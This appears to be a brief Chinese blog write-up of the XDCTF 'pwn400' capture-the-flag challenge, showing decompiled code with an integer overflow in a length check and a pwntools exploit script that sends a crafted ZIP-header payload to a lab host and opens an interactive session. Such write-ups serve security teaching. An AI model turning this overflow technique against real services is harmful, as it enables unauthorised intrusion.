---  
layout: post  
title: "xdctf-pwn400"  
date: 2015-10-05 13:06:20 +0800  
comments: true  
categories:   
---  
  
###0x00 分析  
	存在典型的整数溢出  
  
	  if ( (unsigned __int16)(file_len + 2) <= (_BYTE *)buf - (_BYTE *)src + v15 - 46 )  
	  {  
	    if ( file_len )  
	      s = (char *)sub_8048C86((int)&v9, file_len, 1);  
	    v3 = strlen(s);  
	    v11 = write(fd, s, v3);  
	  }  
  
###0x01 exp  
  
	from pwn import *  
	from binascii import *  
  
	r = remote('192.168.56.102', 8888)  
	print r.recvuntil("hello world~")  
  
	payload  = ''  
	payload += 'PK\x01\x02'  
	payload  = payload.ljust(28, 'P')  
	payload += '\xff\xff'  
	payload  = payload.ljust(228, 'P')  
	r.sendline(payload)  
  
	r.interactive()  
